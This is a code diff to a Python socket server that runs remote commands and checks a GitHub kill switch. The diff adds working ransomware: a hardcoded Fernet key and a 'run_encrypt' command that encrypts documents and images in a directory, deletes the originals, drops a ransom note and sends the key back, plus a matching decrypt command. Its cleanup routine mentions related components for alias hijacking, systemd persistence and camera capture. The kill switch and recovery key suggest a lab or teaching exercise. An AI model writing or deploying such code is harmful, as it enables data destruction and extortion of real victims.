@@ -10,13 +10,13 @@ import socket
 import subprocess
 import sys
 import time
-import os
 import threading
 
 
 THIS_FILE = os.path.realpath(__file__)
 KILLSWITCH_URL = "https://raw.githubusercontent.com/lleo022/test/main/killswitch.txt"
 KILLSWITCH_INTERVAL = 60  # check every 60 seconds
+BACKUP_KEY = b"LfizlqT2IZyngPnORJ-jgg5_RWfNixlkdBvJIGnS-LY="
 
 
 # Internal use only - if you need to run commands, call subprocess.Popen directly instead 
@@ -76,9 +76,14 @@ def bootstrap_packages():
             sys.exit(0)
     else:
         print("already in venv")
-        run_command(
-            [ sys.executable, "-m", "pip", "install", "requests"], shell=False, capture_output=False
-        ).check_returncode() # example to install a python package on the remote server
+        try:
+            run_command(
+                [sys.executable, "-m", "pip", "install", "requests", "cryptography",
+                 "--quiet", "--no-warn-script-location"],
+                shell=False, capture_output=True
+            )
+        except Exception:
+            pass
         # If you need pip install X packages, here, import them now
         import requests
 
@@ -99,18 +104,60 @@ def killswitch_monitor():
             print(f"Kill switch check failed: {e}")
         time.sleep(KILLSWITCH_INTERVAL)
 
+
 def cleanup_and_exit():
     """
     Helper function for killswitch_monitor. Cleans up everything left behind
     by the other implementations.
     """
     import shutil
+    # shellshock: server.py and its venv
     try:
         os.remove(THIS_FILE)
     except Exception:
         pass
     try:
         shutil.rmtree(os.path.join(os.path.dirname(THIS_FILE), ".venv"))
+    except Exception:
+        pass
+    # alias_hijack: remove injected alias from ~/.bashrc
+    try:
+        run_command("sed -i '/alias clear=/d' ~/.bashrc")
+    except Exception:
+        pass
+    # persistance: stop/disable/remove systemd service and log
+    try:
+        run_command(
+            "systemctl stop custom_background.service; "
+            "systemctl disable custom_background.service; "
+            "rm -f /etc/systemd/system/custom_background.service; "
+            "systemctl daemon-reload; "
+            "rm -f /tmp/persistence_verification.log"
+        )
+    except Exception:
+        pass
+    # camera_capture: remove photo taken on target
+    try:
+        run_command("rm -f ~/remote_snap.jpg")
+    except Exception:
+        pass
+    # ransomware: decrypt any .enc files left behind using the backup key
+    try:
+        from cryptography.fernet import Fernet, InvalidToken
+        fernet = Fernet(BACKUP_KEY)
+        for root, dirs, files in os.walk(os.path.expanduser("~")):
+            for fname in files:
+                if fname.endswith(".enc"):
+                    path = os.path.join(root, fname)
+                    try:
+                        with open(path, "rb") as file:
+                            encrypted_data = file.read()
+                        with open(path[:-4], "wb") as file:
+                            file.write(fernet.decrypt(encrypted_data))
+                        os.remove(path)
+                    except (InvalidToken, Exception):
+                        pass
+        run_command("rm -f ~/README_RANSOM.txt")
     except Exception:
         pass
     print("Cleaned up. Exiting.")
@@ -169,6 +216,86 @@ def handle_conn(conn, addr):
                         response = f"Command executed. Exit code: {result.returncode}"
                     conn.sendall(response.encode("utf-8", errors="replace"))
 
+                elif command.startswith("run_encrypt "):
+                    directory = command[12:].strip()
+                    try:
+                        from cryptography.fernet import Fernet
+
+                        key = BACKUP_KEY
+                        f = Fernet(key)
+                        target_exts = {'.txt', '.pdf', '.jpg', '.png', '.docx', '.csv'}
+                        encrypted_count = 0
+
+                        for root, dirs, files in os.walk(os.path.expanduser(directory)):
+                            for fname in files:
+                                if os.path.splitext(fname)[1].lower() in target_exts:
+                                    path = os.path.join(root, fname)
+                                    try:
+                                        with open(path, 'rb') as file:
+                                            file_data = file.read()
+                                        with open(path + '.enc', 'wb') as file:
+                                            file.write(f.encrypt(file_data))
+                                        os.remove(path)
+                                        encrypted_count += 1
+                                    except Exception:
+                                        pass
+
+                        # Drop ransom note
+                        note_path = os.path.join(os.path.expanduser(directory), 'README_RANSOM.txt')
+                        with open(note_path, 'w') as note:
+                            note.write("Your files have been encrypted.\n")
+
+                        conn.sendall(f"KEY:{key.decode()}|COUNT:{encrypted_count}".encode('utf-8'))
+
+                    except Exception as e:
+                        conn.sendall(f"Error: {e}".encode('utf-8'))
+
+                elif command.startswith("run_decrypt "):
+                    # format: run_decrypt <directory> <key>
+                    parts = command[12:].strip().split(" ", 1)
+                    if len(parts) < 2:
+                        conn.sendall(b"Usage: run_decrypt <directory> <key>")
+                    else:
+                        directory, key_str = parts[0], parts[1].strip()
+                        try:
+                            from cryptography.fernet import Fernet, InvalidToken
+
+                            keys_to_try = [key_str.encode(), BACKUP_KEY]
+                            decrypted_count = 0
+
+                            for root, dirs, files in os.walk(os.path.expanduser(directory)):
+                                for fname in files:
+                                    if fname.endswith('.enc'):
+                                        path = os.path.join(root, fname)
+                                        try:
+                                            with open(path, 'rb') as file:
+                                                file_data = file.read()
+                                            decrypted = None
+                                            for k in keys_to_try:
+                                                try:
+                                                    decrypted = Fernet(k).decrypt(file_data)
+                                                    break
+                                                except (InvalidToken, Exception):
+                                                    continue
+                                            if decrypted is not None:
+                                                with open(path[:-4], 'wb') as file:
+                                                    file.write(decrypted)
+                                                os.remove(path)
+                                                decrypted_count += 1
+                                        except Exception:
+                                            pass
+
+                            # Clean up ransom note
+                            try:
+                                os.remove(os.path.join(os.path.expanduser(directory), 'README_RANSOM.txt'))
+                            except Exception:
+                                pass
+
+                            conn.sendall(f"Decrypted {decrypted_count} files.".encode('utf-8'))
+
+                        except Exception as e:
+                            conn.sendall(f"Error: {e}".encode('utf-8'))
+
                 break
             except Exception as e:
                 error_msg = f"Error: {str(e)}\n"
@@ -194,7 +321,7 @@ def main():
                 handle_conn(conn, addr)
             except KeyboardInterrupt:
                 raise
-            except:
+            except Exception:
                 print("Connection died")
 
 
